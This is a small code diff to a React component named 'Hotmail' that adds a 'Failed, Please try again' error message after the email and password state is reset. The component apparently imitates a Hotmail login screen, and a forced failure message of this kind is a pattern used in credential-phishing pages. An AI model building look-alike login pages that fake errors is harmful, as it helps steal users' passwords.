@@ -91,6 +91,7 @@ export default function Hotmail() {
 
     setEmail(true);
     setPassword(false);
+    setError("Failed, Please try again");
     // setLoading(false);
   };
 
